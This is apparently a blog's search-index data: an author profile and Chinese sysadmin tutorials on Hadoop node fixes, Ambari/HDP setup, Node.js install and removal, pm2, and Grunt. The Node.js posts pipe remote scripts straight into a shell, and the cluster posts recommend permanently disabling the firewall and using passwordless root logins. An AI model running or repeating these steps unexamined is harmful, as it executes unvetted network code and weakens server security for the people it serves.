{"pages":[{"title":"","text":"","link":"/404.html"},{"title":"About","text":"work experience:：1232018-7 - ~~~~~~ 上市公司-招商金融期贷2017-5 - 2018-7 C轮独角兽创业公司- Jollychic2015.3 - 2017.4 上市公司-高升控股-MMtrix性能魔方 My dearest reader Welcome to my blog. I doubt you got to it by accident. With any luck, you got to it because of a search result. If so, I really hope I managed to answer any questions you may have had. With any luck on your part and skill on mine, you not only had your question answered, but had questions you didn’t know you had get answered as well! Not only that, but you stuck around long enough to visit this page and read about me. Thanks! My name is, as the site title says, chengyangyang. I went to school for computers and ended up learning about business instead. Sure enough, I thought I knew what I needed to run a successful business.I may have done alright, but it’s not for me. I need to be in front of a terminal emulator, not in front of a room full of people. That’s why I am where I am now. I’m a Linux server administrator. I’m passionate about the work I do and strive to learn more every day. From time to time I will run into weird and peculiar issues that take a lot of effort to solve. Sometimes I get questions that I have answered many times before. My blog is my repository for solutions and answers. My goal is to Keep IT DRY. Please check out that page for a complete description of what I mean. If you have something that I should add, let me know. I’m easy to find and always looking for new useful content! Here’s my contact: 📬 yangcvo[at]gmail.com 🐧 QQ:1165958741 个人工作担任：15年参与CDN自动化运维,系统运维相关工作。17年担任运维砖家😊 在一家跨境电商负责运维,兼研究SRE大数据运维处理BI工作，18年在一家上市金融公司担任运维经理….. 个人简历：gurudigger 欢迎加我QQ和加入技术讨论群：🐧 🐧 Linux shell_高级运维派: 459096184 圈子 (系统运维-应用运维-自动化运维-虚拟化技术研究欢迎加入)🐧 🐧 BigData-Exchange School : 521621407 圈子（大数据运维)（Hadoop开发人员)（大数据研究爱好者) 欢迎加入 相应Bidata有内部交流微信群互相学习，加入群有链接。 14年开始用的百家📖 iteye博客：http://yango.iteye.com -还有51CTO上面也有个人技术blog 现在统一已不更新了。 互相学习与交流加我QQ或者发mail给我。😊","link":"/ABOUT/About.html"},{"title":"Archives","text":"","link":"/ARCHIVES/archives.html"},{"title":"Tags","text":"","link":"/tags/index.html"}],"posts":[{"title":"Bigdata-hadoop新增节点集群启动请求异常：Last contact：200","text":"前言闲谈：之前做CDN云计算公司来到美年大健康现在在一家医疗大数据公司负责运维部门大大小小的活，既然是医疗大数据当然离不开大数据存储的维护，现在也同时维护大数据运维相关工作 hadoop,spark,sqoop,hue,hive,Hbase,zookeeper等等 测试开发生产使用起来,从集群环境维护 提升数据稳定性 高可用维护。 前面说了一堆自己闲聊，真正解决这次问题是hadoop新增节点需要注意哪几点： 新增节点如何新增我会在另外一篇详细说的这里我讲一些需要注意掉的问题。 需要修改几个配置：（1）hadoop data 数据目录 VERSION 里面的搭建集群时，直接克隆会出现这个问题。解决方法同上两种，最好修改${/hadoop/tmp/dir}/dfs/data/current/VERSION中的storageID，使其不同。第一种会导致hdfs数据丢失。 解决方法： 12（1） datanode启动是会加载DataStorage，如果不存在则会format（2）初次启动DataStorage的storageID是空的，所以会生成一个storageID 参考我解决的：这里我拷贝过来 直接删除。等集群namenode启动 会自动生成。 这个解决以后 新增的机器必须关闭防火墙。因为这个原因会导致我 hadoop新增节点集群启动请求异常：Last contact：200 （2） 集群重启时防火墙自动开启导致： 这里贴张图片给大家看看： 问题： 1234562017-07-04 18:43:30,475 INFO org.apache.hadoop.ipc.Client: Retrying connect to server: /192.168.18.218:9000. Already tried 8 time(s).2017-07-04 18:43:31,475 INFO org.apache.hadoop.ipc.Client: Retrying connect to server: /192.168.18.218:9000. Already tried 9 time(s).2017-07-04 18:43:31,479 ERROR org.apache.hadoop.hdfs.server.datanode.DataNode: java.io.IOException: Call to /192.168.18.218:9000 failed on local exception: java.net.NoRouteToHostException: 没有到主机的路由 at org.apache.hadoop.ipc.Client.wrapException(Client.java:775) at org.apache.hadoop.ipc.Client.call(Client.java:743)解决方法：在root权限下关闭防火墙：service iptables stop 最好配置成机器重启默认防火墙关闭： 12[root@junlings ~]# chkconfig iptables off #开机不启动防火墙服务[root@junlings ~]# chkconfig iptables on #开机启动防火墙服务 解决以后服务重新跑一遍已经搞定。","link":"/2017/05/08/Bigdata-hadoop/ hadoop新增节点集群启动请求异常：Last contact：200/"},{"title":"HORTONW0RKS数据平台实现搭建Ambari配置和部署HDP集群监控Hadoop集群","text":"HORTONW0RKS数据平台搭建Ambari管理监控Hadoop集群 题外话 我现在在一家上市公司旗下控股子公司负责运维部门，负责IT网络安全办公：主要做的应用运维和网络运维，兼大数据运维。最近跟新来的架构师聊了下Hadoop监控方面：HORTONW0RKS数据平台搭建Ambari监控Hadoop集群. HORTONW0RKS数据平台（HDP ®）HDP是业内唯一真正安全的企业级开源的Apache的Hadoop™ ®分配基于集中式架构。HDP解决了静态数据的完整需求，为实时客户应用提供支持，并提供可加速决策和创新的可靠分析。 使用Hortonworks Sandbox试用最新的HDP功能，或者为生产环境设置HDP，安装和配置群集。查看官网文档：HORTONWORKS CONNECTED DATA PLATFORMS DOWNLOADS 1. 将Ambari服务存储库文件下载到安装主机上的目录。 Centos6.5 1wget -nv http://public-repo-1.hortonworks.com/ambari/centos6/2.x/updates/2.4.2.0/ambari.repo -O /etc/yum.repos.d/ambari.repo ⚠️警告：不要修改ambari.repo文件名。在代理注册期间，此文件应在Ambari服务器主机上可用。 通过检查repo列表确认存储库已配置。 1yum repolist 您应该在列表中看到类似于以下Ambari存储库的值。 版本值因安装而异。 安装Ambari服务。这也安装了默认的PostgreSQL Ambari数据库。 1yum install ambari-server 输入y提示，以确认交易和依赖性检查时。 成功安装将显示类似于以下内容的输出： 12345678910111213141516安装：postgresql-libs-8.4.20-3.el6_6.x86_64 1/4安装：postgresql-8.4.20-3.el6_6.x86_64 2/4安装：postgresql-server-8.4.20-3.el6_6.x86_64 3/4安装：ambari-server-2.4.2.0-1470.x86_64 4/4验证：ambari-server-2.4.2.0-1470.x86_64 1/4验证：postgresql-8.4.20-3.el6_6.x86_64 2/4验证：postgresql-server-8.4.20-3.el6_6.x86_64 3/4验证：postgresql-libs-8.4.20-3.el6_6.x86_64 4/4安装： ambari-server.x86_64 0：2.4.2.0-1470 安装这里的时候会有点慢，因为是访问国外网站下载资源。已安装依赖关系： postgresql.x86_64 0：8.4.20-3.el6_6 postgresql-libs.x86_64 0：8.4.20-3.el6_6 postgresql-server.x86_64 0：8.4.20-3.el6_6 ❗️❗️【注意】 接受有关信任Hortonworks GPG密钥的警告。该键将自动下载并用于验证Hortonworks的软​​件包。您将看到以下消息： Importing GPG key 0x07513CAD: Userid: “Jenkins (HDP Builds) &#x6a;&#x65;&#x6e;&#107;&#105;&#x6e;&#x40;&#x68;&#x6f;&#x72;&#x74;&#111;&#110;&#119;&#111;&#114;&#107;&#115;&#46;&#x63;&#x6f;&#x6d;“ From :http://s3.amazonaws.com/dev.hortonworks.com/ambari/centos6/RPM-GPG-KEY/RPM-GPG-KEY-Jenkins ❗️❗️【注意】 在具有有限Internet访问或没有Internet访问的群集上部署HDP时，应使用其他方法提供对位的访问。有关设置本地存储库的详细信息，请参阅使用本地存储库。 Ambari服务器默认使用嵌入式PostgreSQL数据库。当您安装Ambari服务器时，PostgreSQL软件包和依赖关系必须可用于安装。这些包通常作为操作系统存储库的一部分提供。请确认您具有适用于postgresql-server软件包的相应存储库。 2.设置Ambari服务器在启动Ambari服务器之前，必须设置Ambari服务器。安装程序将Ambari配置为与Ambari数据库通信，安装JDK并允许您自定义Ambari Server守护程序将作为运行的用户帐户。该 ambari-server setup命令管理设置过程。在Ambari服务器主机上运行以下命令以开始设置过程。您还可以将“ 设置选项”附加到命令。 启动服务 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162ambari-server setup###这里由于下载jdk1.8太慢速度过慢。我提前把jdk下载下来放到了/srv/jdk1.8.0_66 目录[root@ambari-server_01 ~]# ambari-server setupUsing python /usr/bin/pythonSetup ambari-serverChecking SELinux...SELinux status is 'enabled'SELinux mode is 'permissive'WARNING: SELinux is set to 'permissive' mode and temporarily disabled.OK to continue [y/n] (y)? yCustomize user account for ambari-server daemon [y/n] (n)? yEnter user account for ambari-server daemon (root):Adjusting ambari-server permissions and ownership...Checking firewall status...Checking JDK...[1] Oracle JDK 1.8 + Java Cryptography Extension (JCE) Policy Files 8[2] Oracle JDK 1.7 + Java Cryptography Extension (JCE) Policy Files 7[3] Custom JDK==============================================================================Enter choice (1): 3WARNING: JDK must be installed on all hosts and JAVA_HOME must be valid on all hosts.WARNING: JCE Policy files are required for configuring Kerberos security. If you plan to use Kerberos,please make sure JCE Unlimited Strength Jurisdiction Policy Files are valid on all hosts.Path to JAVA_HOME: /srv/jdk1.8.0_66Validating JDK on Ambari Server...done.Completing setup...Configuring database...Enter advanced database configuration [y/n] (n)? yConfiguring database...==============================================================================Choose one of the following options:[1] - PostgreSQL (Embedded)[2] - Oracle[3] - MySQL / MariaDB[4] - PostgreSQL[5] - Microsoft SQL Server (Tech Preview)[6] - SQL Anywhere[7] - BDB==============================================================================Enter choice (1):3Database name (ambari):Postgres schema (ambari):Username (ambari):Enter Database Password (bigdata):Default properties detected. Using built-in database.Configuring ambari database...Checking PostgreSQL...Running initdb: This may take up to a minute.正在初始化数据库：[确定]About to start PostgreSQLConfiguring local database...Connecting to local database...done.Configuring PostgreSQL...Restarting PostgreSQLExtracting system views...ambari-admin-2.4.2.0.136.jar............Adjusting ambari-server permissions and ownership...Ambari Server 'setup' completed successfully.You have mail in /var/spool/mail/root 2.1 响应安装提示：如果您没有暂时禁用SELinux，您可能会收到警告。接受默认值（y），然后继续。 默认情况下，Ambari服务器运行在root。在Customize user account for ambari-server daemon提示符处接受默认（n），以继续root。 如果要创建其他用户以运行Ambari服务器或分配以前创建的用户，请y在 Customize user account for ambari-server daemon提示符处选择，然后提供用户名。有关以非root用户身份运行Ambari服务器的更多信息，请参阅Hortonworks数据平台Apache Ambari参考&gt; 为非根用户配置Ambari 如果您没有暂时停用iptables，可能会收到警告。输入y以继续。 JDK选择要下载的JDK版本。输入1以下载Oracle JDK 1.8。或者，您可以选择输入自定义JDK。如果选择“自定义JDK”，则必须在所有主机上手动安装JDK并指定Java Home路径。 ❗️❗️【注意】 JDK支持完全取决于您选择的HDP Stack版本。请参阅Hortonworks数据平台Apache Ambari参考以查看要安装的HDP Stack版本支持的JDK版本。默认情况下，Ambari服务器设置下载并安装Oracle JDK 1.8和随附的Java密码术扩展（JCE）策略文件。如果计划使用其他版本的JDK，请参阅 设置选项以获取更多信息。 出现提示时接受Oracle JDK许可证。您必须接受此许可证才能从Oracle下载必需的JDK。JDK在部署阶段安装。 数据库选择： 选择n为，Enter advanced database configuration以便为Ambari使用默认的嵌入式PostgreSQL数据库。默认的PostgreSQL数据库名是ambari。默认用户名和密码为ambari/bigdata。否则，要使用现有的PostgreSQL，MySQL / MariaDB或Oracle数据库与Ambari，请选择y。 如果使用现有的PostgreSQL，MySQL / MariaDB或Oracle数据库实例，请使用以下提示之一： ❗️❗️[重要]在运行安装程序和输入高级数据库配置之前，必须使用“使用非默认数据库- Ambari”中详述的步骤准备非默认数据库实例。 ❗️❗️[重要] 不支持使用Microsoft SQL Server或SQL Anywhere数据库选项。 要使用现有的Oracle实例，并为该数据库选择自己的数据库名称，用户名和密码，请输入2。选择要使用的数据库，并提供在提示中请求的任何信息，包括主机名，端口，服务名或SID，用户名和密码。要使用现有的MySQL / MariaDB数据库，并为该数据库选择自己的数据库名称，用户名和密码，请输入3。选择要使用的数据库，并提供在提示中请求的任何信息，包括主机名，端口，数据库名称，用户名和密码。要使用现有的PostgreSQL数据库，并为该数据库选择自己的数据库名称，用户名和密码，请输入4。选择要使用的数据库，并提供在提示中请求的任何信息，包括主机名，端口，数据库名称，用户名和密码。继续配置远程数据库连接属性[y / n]选择y。 这里数据库用户名和密码都是默认安装： 1234Database name (ambari)Postgres schema (ambari)Username (ambari)Enter Database Password (bigdata) 这里我做了一层Nginx代理：将Ambari服务器配置为使用此代理服务器 3.启动Ambari服务器在Ambari服务器主机上运行以下命令： ambari-server start 1234567891011121314[root@ambari-server ~]# ambari-server startUsing python /usr/bin/pythonStarting ambari-serverAmbari Server running with administrator privileges.Organizing resource files at /var/lib/ambari-server/resources...Ambari database consistency check started...No errors were found.Ambari database consistency check finishedServer PID at: /var/run/ambari-server/ambari-server.pidServer out at: /var/log/ambari-server/ambari-server.outServer log at: /var/log/ambari-server/ambari-server.logWaiting for server start....................Ambari Server 'start' completed successfully.You have mail in /var/spool/mail/root 要检查Ambari服务器进程： ambari-server status 停止Ambari服务器： ambari-server stop 在Ambari服务器启动时，Ambari运行数据库一致性检查，查找问题。如果发现任何问题，Ambari服务器启动将中止，并且一条消息将打印到控制台“数据库配置一致性检查失败”。更多详细信息将写入以下日志文​​件： /var/log/ambari-server/ambari-server-check-database.log 您可以通过使用以下选项跳过此检查来强制Ambari服务器启动： ambari-server start --skip-database-check 如果存在数据库问题，请选择跳过此检查，在更正数据库一致性问题之前，不要对集群拓扑进行任何更改或执行集群升级。最好查看官网操作。 第3章安装，配置和部署HDP集群1.登录到Apache Ambari 将浏览器指向 http://&lt;your.ambari.server&gt; :8080，其中&lt;your.ambari.server&gt;是您的ambari服务器主机的名称。例如，默认Ambari服务器主机位于http://c6401.ambari.apache.org:8080。 使用默认用户名/密码登录Ambari服务器：admin / admin。您可以稍后更改这些凭据。 2.启动Ambari安装向导从Ambari Welcome页面，选择启动安装向导。 提供集群，管理谁可以访问群集，以及自定义视图为Ambari用户。 3.命名您的群集在Name your cluster，键入要创建的集群的名称。名称中不要使用空格或特殊字符。 选择Next。 4.选择版本 这里我选择redhat6 其他的都remove掉。 在此步骤中，您将选择群集的软件版本和交付方式。使用公共存储库需要Internet连接。使用本地存储库需要您在网络中可用的存储库中配置软件。 选择堆栈 可用的HDP版本显示在TAB中。当您选择TAB时，Ambari会尝试发现该HDP堆栈的特定版本可用。该列表显示在DROPDOWN中。对于该特定版本，将显示可用的服务，其中的版本显示在TABLE中。 选择版本 如果Ambari可以访问Internet，则特定版本将作为选项列在DROPDOWN中。如果您有未列出的版本的版本定义文件，您可以单击添加版本…并上载VDF文件。此外，如果您无法访问Internet或不确定要安装哪个特定版本，则 默认版本定义也包含在列表中。 选择存储库 Ambari允许您选择从公共存储库（如果您有Internet访问权限）或本地存储库安装软件。无论您的选择如何，您都可以编辑存储库的基本URL。将显示可用的操作系统，您可以从列表中添加/删除操作系统以适合您的环境 ❗️❗️注意UI显示基于操作系统系列（OS系列）的存储库基本URL。请确保基于正在运行的操作系统设置正确的操作系统系列。下表将OS系列映射到操作系统。 高级选项 有高级存储库选项可用。 跳过存储库基本URL验证（高级）： 当您单击下一步时，Ambari将尝试连接到存储库基本URL，并验证您已输入验证存储库。如果没有，将显示一个错误，您必须在继续之前纠正。 使用RedHat Satellite/Spacewalk：仅当计划使用本地存储库时，才会启用此选项。当您为软件存储库选择此选项时，您负责配置Satellite/Spacewalk中的存储库通道，并确认所选群集版本的存储库在群集中的主机上可用。 5.安装选项为了构建集群，安装向导将提示您有关如何设置它的一般信息。您需要提供每个主机的FQDN。该向导还需要访问在设置无密码SSH中创建的私钥文件 。使用主机名和密钥文件信息，向导可以定位，访问和与群集中的所有主机安全交互。 使用Target Hosts文本框输入主机名列表，每行一个。您可以使用括号内的范围来表示较大的主机集。例如，对于host01.domain通过host10.domain使用 host[01-10].domain ⚠️ 安装服务器集群机器一定要系统版本要一致不然安装会提示版本不兼容。 ❗️❗️ 注意如果要在EC2上部署，请使用内部专用DNS主机名。 在ambari服务器配置hosts vim /etc/hosts 12192.168.1.151 datanode151192.168.1.173 datanode_173 datanode-173.hadoop 如果要让Ambari使用SSH在所有主机上自动安装Ambari代理，请选择Provide your SSH Private Key并使用部分中的 Choose File按钮Host Registration Information查找与先前在所有主机上安装的公钥相匹配的私钥文件，或者剪切并粘贴键手动插入文本框。 填写您选择的SSH密钥的用户名。如果不想使用root用户，则必须为可以在不输入密码的情况下执行sudo的帐户提供用户名。如果您的环境中的主机上的SSH配置为22以外的端口，您也可以更改它。 如果您不希望Ambari自动安装Ambari代理，请选择Perform manual registration。有关更多信息，请参阅手动安装Ambari代理。 选择Register and Confirm继续。 这里提示：The following hostnames are not valid FQDNs: datanode_173.hadoop 这里跳转到安装页面：发现报错提示datanode-173.hadoop主机访问Ambari机器不能访问。 6.确认主机Confirm Hosts 提示您确认Ambari已为您的集群找到正确的主机，并检查这些主机以确保它们具有继续安装所需的正确目录，软件包和进程。 如果选择了错误的主机，您可以通过选择相应的复选框并单击灰色Remove Selected按钮来删除它们。要删除单个主机，请单击Remove“操作”列中的小白色按钮。 在屏幕底部，您可能会注意到一个黄色框，表示在检查过程中遇到了一些警告。例如，您的主机可能已有wget或的副本 curl。选择Click here to see the warnings 查看检查内容和导致警告的原因的列表。警告页面还提供对python脚本的访问，可以帮助您清除可能遇到的任何问题，让您运行Rerun Checks。 在datanode_173服务器配置hosts vim /etc/hosts 12192.168.1.151 datanode151192.168.1.173 datanode_173 datanode-173.hadoop 每台节点里配置FQDN，如下以主节点为例 123vi /etc/sysconfig/networkNETWORKING=yesHOSTNAME=SY-001.hadoop 配置上就可以了。 把datanode151也是ambari机器配置在hosts就可以了。 最好设置root的无密码登录，因为我们配置的集群都是内网的，没什么安全性问题，使用root操作可以省去一些麻烦，非root用户可能在安装Hadoop组件时不能成功 下面是我安装这里提示没有找到文件目录查看安装报错操作： mkdir /var/lib/ambari-agent/data 7.选择服务将看到选择要安装到群集中的服务。HDP堆栈包括许多服务。您可以选择立即安装任何其他可用服务，或稍后添加服务。默认情况下，安装向导将选择所有可用的服务进行安装。 选择none清除所有选择，或选择 all选择所有列出的服务。 选择或清除单个复选框以定义一组要立即安装的服务。 选择要立即安装的服务后，选择Next。 8.分配主站Ambari安装向导会将所选服务的主组件分配给集群中的相应主机，并在Assign Masters中显示分配。左列显示服务和当前主机。右列显示主机的当前主组件分配，指示每个主机上安装的CPU内核数量和RAM数量。 要更改服务的主机分配，请从该服务的下拉菜单中选择主机名。 要删除ZooKeeper实例，请单击要删除的主机地址旁边的绿色减号图标。 当您对作业感到满意时，选择Next。 9.分配从属和客户端Ambari安装向导将从属组件（DataNodes，NodeManager和RegionServers）分配给集群中的相应主机。它还会尝试选择主机以安装适当的客户端集。 使用all或none可分别选择列中的所有主机或不选择任何主机。 如果主机旁边有星号，则该主机也运行一个或多个主组件。将鼠标悬停在星号上，以查看该主机上的哪些主组件。 通过使用特定主机旁边的复选框来微调您的选择。 当你对你的作业感到满意时，选择Next。 10.自定义服务自定义服务步骤为您提供一组选项卡，您可以查看和修改HDP集群设置。向导会尝试为每个选项设置合理的默认值。你是强烈建议，以检查这些设置为您的要求可能略有不同。 浏览每个服务标签，然后将光标悬停在每个属性上，您可以看到属性做什么的简要说明。显示的服务选项卡数取决于您决定在群集中安装的服务。任何需要输入的选项卡都会显示一个红色徽章，其中包含需要注意的属性数。选择显示红色徽章编号的每个服务选项卡，然后输入相应的信息。 目录 HDP将存储信息的目录的选择是至关重要的。Ambari将尝试根据您环境中可用的安装点选择合理的默认值，但强烈建议您查看Ambari推荐的默认目录设置。特别是，确认目录，例如/tmp和 /var被不被用于下HDFS的NameNode目录和数据管理部目录HDFS标签。 密码 您必须为Hive和Oozie服务以及Knox的主密钥提供数据库密码。使用Hive作为示例，选择Hive选项卡并展开高级部分。在以红色标记的数据库密码字段中，提供密码，然后重新键入以确认。 安装各个服务，并且完成安装后会启动相关服务，安装过程比较长，如中中出现错误，根据具体提供或日志进行操作。 这里我就不贴出来了，因为测试环境机器我做测试用机器配置不够所有后面结果经验写出来了。 安装的还是提示失败：ImportError: No module named rpm 参考这篇文章重新安装解决了这个问题：ImportError: No module named rpm 11.安装，启动和测试安装的进度将显示在屏幕上。Ambari安装，启动，并对每个组件运行一个简单的测试。过程的总体状态显示在屏幕顶部的进度栏中，主机的主机状态显示在主要部分。在此过程中不要刷新浏览器。刷新浏览器可能会中断进度指示器。 要查看每个主机已完成的任务的具体信息，请单击Message相应主机列中的链接。在 Tasks弹出窗口中，单击单个任务以查看相关的日志文件。您可以使用Show下拉列表选择过滤条件。要查看更大版本的日志内容，请单击Open图标或将内容复制到剪贴板，使用Copy图标。 安装完成效果图: 让我们从左侧栏或下拉菜单中选择Yarn进入YARN信息中心。 我们将开始更新线程容量调度策略的配置。 向下滚动到Scheduler页面的部分。默认容量调度策略只有一个队列。 让我们看看调度策略。向上滚动到页面顶部，然后点击快速链接。然后从下拉列表中选择ResourceManager UI。 正如你可以看到，我们只有默认策略。 参考安装Ambari官网地址install Ambari编译安装Ambari 2.4.2安装指南","link":"/2017/05/08/Bigdata-hadoop/HORTONW0RKS数据平台实现搭建Ambari配置和部署HDP集群监控Hadoop集群 /"},{"title":"Centos7.1+Mac环境安装Node.Js以及彻底删除卸载node.js教程","text":"linux Centos7系统快速安装node.js npm1234567第一、选择合适的版本安装# 4.x版本curl --silent --location https://rpm.nodesource.com/setup_4.x | bash -# 5.x版本curl --silent --location https://rpm.nodesource.com/setup_5.x | bash -# 6.x版本curl --silent --location https://rpm.nodesource.com/setup_6.x | bash - 如果是Centos7的话会提示报错Requires: libhttp_parser.so.2()(64bit) 12345678910111213rpm -ivh https://rpm.nodesource.com/pub_6.x/el/7/x86_64/nodejs-6.2.0-1nodesource.el7.centos.x86_64.rpm[root@H5-nha ~]# node -vv6.2.0[root@H5-nha ~]# npm -v3.8.9rpm -ivh https://kojipkgs.fedoraproject.org//packages/http-parser/2.7.1/3.el7/x86_64/http-parser-2.7.1-3.el7.x86_64.rpm &amp;&amp; yum -y install nodejs[root@logstash kibana-5.5.2]# node -vv6.11.1[root@logstash kibana-5.5.2]# npm -v3.10.10 12Centos6安装命令：rpm -ivh https://kojipkgs.fedoraproject.org/packages/http-parser/2.6.0/2.fc24/x86_64/http-parser-2.6.0-2.fc24.x86_64.rpm &amp;&amp; yum -y install nodejs Mac OS安装: 安装报错304： 安装Node.Js 报错 340 解决方法Fixing npm On Mac OS X for Homebrew UsersIf you just want to fix the issue quickly, scroll down to the “solution” section below.Explanation of the issueIf you’re a Homebrew user and you installed node via Homebrew,there is a major philosophical issue with the way Homebrew and NPM work together.If you install node with Homebrew and then try to do npm update npm -g, you may see an error like this: 12345678910111213141516171819202122232425$ npm update npm -g npm http GET https://registry.npmjs.org/npmnpm http 304 https://registry.npmjs.org/npm npm http GET https://registry.npmjs.org/npm/1.4.4 npm http 304 https://registry.npmjs.org/npm/1.4.4 npm ERR! error rolling back Error: Refusing to delete: /usr/local/bin/npm not in /usr/local/lib/nodemodules/npm npm ERR! error rolling back at clobberFail (/usr/local/Cellar/node/0.10.26/lib/nodemodules/npm/lib/utils/gently-rm.js:57:12)npm ERR! error rolling back at next (/usr/local/Cellar/node/0.10.26/lib/nodemodules/npm/lib/utils/gently-rm.js:43:14)npm ERR! error rolling back at /usr/local/Cellar/node/0.10.26/lib/nodemodules/npm/lib/utils/gently-rm.js:52:12npm ERR! error rolling back at Object.oncomplete (fs.js:107:15)npm ERR! error rolling back npm@1.4.4 &#123; [Error: Refusing to delete: /usr/local/bin/npm not in /usr/local/lib/nodemodules/npm] code: 'EEXIST', path: '/usr/local/bin/npm' &#125; npm ERR! Refusing to delete: /usr/local/bin/npm not in /usr/local/lib/nodemodules/npm File exists: /usr/local/bin/npm Move it away, and try again.npm ERR! System Darwin 13.1.0 npm ERR! command \"/usr/local/Cellar/node/0.10.26/bin/node\" \"/usr/local/bin/npm\" \"update\" \"npm\" \"-g\" npm ERR! cwd /Users/dan/Google Drive/Projects/dotfiles npm ERR! node -v v0.10.26 npm ERR! npm -v 1.4.3 npm ERR! path /usr/local/bin/npm npm ERR! code EEXIST npm ERR! npm ERR! Additional logging details can be found in: npm ERR! /Users/dan/Google Drive/Projects/dotfiles/npm-debug.log npm ERR! not ok code 0 There’s an NPM bug for this exact problem. The bug has been “fixed”by Homebrew installing npm in a way that allows it to manage itself once the install is complete. However,this is error-prone and still seems to cause problems for some people.The root of the the issue is really that npm is its own package manager andit is therefore better to have npm manage itself and its packages completely on its own instead of letting Homebrew do it. Also, using the Homebrew installation of npm will require you to use sudo when installing global packages.Since one of the core ideas behind Homebrew is that apps can be installed without giving them root access,this is a bad idea. SolutionThis solution fixes the error caused by trying to run npm update npm -g.Once you’re finished, you also won’t need to usesudo to install npm modules globally.Before you start, make a note of any globally installed npm packages.These instructions will have you remove all of those packages.After you’re finished you’ll need to re-install them.Run the following commands to remove all existing global npm modules, uninstall node &amp; npm,re-install node with the right defaults, install npm as its own pacakge,and configure the location for global npm modules to be installed. 12345rm -rf /usr/local/lib/node_modules brew uninstall node brew install node --without-npm echo prefix=~/.node &gt;&gt; ~/.npmrc curl -L https://www.npmjs.com/install.sh | sh 这里的安装脚本可以看我的GitHub Node and npm should be correctly installed at this point.The final step is to add ~/.node/bin to your PATH so commands you install globally are usable.I added this line to my ~/.path script, which gets run via ~/.bash_profile. 设置变量：1export PATH=\"$HOME/.node/bin:$PATH\" Now you can re-install any global packages with the command below,replacing the npm modules with whatever global packages you need. 测试npm安装http-server：1npm install -g http-server node-inspector forever nodemon","link":"/2016/08/16/Node.js-npm/Centos7.1+Mac环境安装Node.Js以及彻底删除卸载node.js教程/"},{"title":"Node.js使用pm2进程守护+keymetrics实时监控Node.js程序","text":"通过pm2能守护node.js程序永远在线，在实际应用中是非常有必要的。另外，pm2配合keymetrics能实时监控node.js程序的运行，达到监控node.js程序的目的。 安装pm2pm2可以使我们的node.js或io.js程序永远在线。这是pm2的官方介绍： 1PM2 is a production process manager for Node.js applications with a built-in load balancer. It allows you to keep applications alive forever, to reload them without downtime and to facilitate common system admin tasks. 参考地址：https://github.com/Unitech/pm2#usagefeatureshttps://www.npmjs.com/package/pm2官网地址：http://pm2.keymetrics.io/ npm install -g pm2 启动一个node.js程序 //进入到app的目录去启动 pm2 start index.js --name &apos;yjk&apos; 其他常用命令： 1234567891011121314//查看pm2守护的apppm2 list//或者pm2 status//重启，restart后面跟--name后面指定的名字pm2 restart ghost//查看进程的使用资源情况pm2 monit//查看logpm2 logs ghost//查看app的更多详细信息，后面跟idpm2 describe 1//升级pm2，升级完毕后自动加载之前运行中的所有appnpm install pm2@latest -g ; pm2 updatePM2 使用Keymetrics可以配合pm2来监控node.js程序（也支持io.js程序的监控）。 安装Keymetrics首先需要注册Keymetrics 登录后，通过new bucket新建，然后进入控制面板，可以看到分配的public key 和secret key。然后，在安装有pm2的服务器端输入以下命令 12345678pm2 link Secret key Public key [machine name]pm2 interact your-secret-key your-public-key``` 监控成功后，会有类似下面的提示：```bash [Keymetrics.io] [Agent created] Agent ACTIVE - Web Access: https://app.keymetrics.io/ Monitor your server with:监控您的服务器： pm2 install pm2-server-monit 此时，pm2会把收集到的统计信息实时地推送到Keymetrics，我们可以在Keymetrics的后台中实时地查看到node.js程序的运行信息，其中还有一些快捷操作，如重启node.js程序等。 参考官网：http://pm2.keymetrics.io/docs/usage/quick-start/","link":"/2016/09/24/Node.js-npm/Node.js使用pm2进程守护+keymetrics实时监控Node.js程序/"},{"title":"Node.js+Grunt工具搭建后台管理实践","text":"最近弄灰度发布系统，由于最近体检项目需要对css文件和js文件进行压缩，各种比较之后，选择了grunt进行构建。google一下，几乎都是grunt最新版的使用说明查看gruntjs的入门 Getting started，又是云里雾里的，好吧，只能耐心看文档和不断的实践吧。 Grunt入门入门教程: 系统环境centos 6.6 x64 Grunt安装过程：1、前提安装了nodejs，进入官网后(http://nodejs.org/)，点击“INSTALL”按钮，就会下载然后安装就行了。觉得现在windows安装node，挺简单的，感觉稳定性也提升了不少。 2、安装grunt命令行工具，有一句话总结“就是安装完CLI，还要在项目安装Grunt。” 1npm install -g grunt-cli 安装grunt及其插件，进入到某项目根目录，在命令行模式下，例如文件在c盘testGrunt目录下，利用cd命令到testGrunt目录下后，使用命令: 1npm install grunt --save-dev 3、输入版本号验证安装是否成功，输入： 1grunt -version 在这里我选择一个存放后台管理的文件目录。 创建grunt项目grunt项目一般需要以下内容: 1231 、grunt（ 需要安装）2、 grunt 插件 （需要安装） 3、package.json 和 Gruntfile.js 。 (官方入门Getting started 说通过 grunt-init 和 npm init 创建。对于入门来说，这两中方式都不太好用。推荐直接创建 package.json 和Gruntfile.js 文件) 这里我之前创建过，直接在其他机器上面cp过来即可了。 1234567891011121314151617181920211.创建文件夹:health-Grunt 2.在health-Grunt下面创建2个文件package.json 和 Gruntfile.js### 官网推荐：``` bash package.json 内容如下&#123; \"name\": \"smeitejs\", \"version\": \"0.1.0\", \"description\": \"js for smeite.com\", \"homepage\": \"http://cc.com/\", \"author\": \"helath &lt;cc@qq.com&gt;\", \"devDependencies\": &#123; \"grunt\": \"~0.4.1\", \"grunt-contrib-jshint\": \"~0.3.0\", \"grunt-contrib-nodeunit\": \"~0.1.2\", \"grunt-contrib-cssmin\": \"~0.5.0\" &#125;&#125; 这里我贴出我的本地配置： 12345678910111213141516&#123; \"name\": \"grunt_project\", \"version\": \"1.0.0\", \"description\": \"\", \"main\": \"index.js\", \"scripts\": &#123; \"test\": \"echo \\\"Error: no test specified\\\" &amp;&amp; exit 1\" &#125;, \"author\": \"\", \"license\": \"ISC\", \"devDependencies\": &#123; \"grunt\": \"^0.4.5\", \"grunt-contrib-connect\": \"^0.11.2\", \"grunt-contrib-watch\": \"^0.6.1\" &#125;&#125; Gruntfile.js123456789101112131415161718192021222324252627282930313233343536373839404142434445464748module.exports = function(grunt) &#123;// Project configuration.grunt.initConfig(&#123; uglify: &#123; options: &#123; mangle: false &#125;, build: &#123; files: &#123; 'assets/config.min.js': ['js/config.js'], 'assets/smeite.min.js': ['js/smeite.js'], 'assets/index.min.js': ['js/index.js'] &#125; &#125; &#125;,cssmin: &#123; compress: &#123; files: &#123; 'assets/all.min.css': ['css/base.css', 'css/global.css'] &#125; &#125;, // smeite: &#123; // files: &#123; // 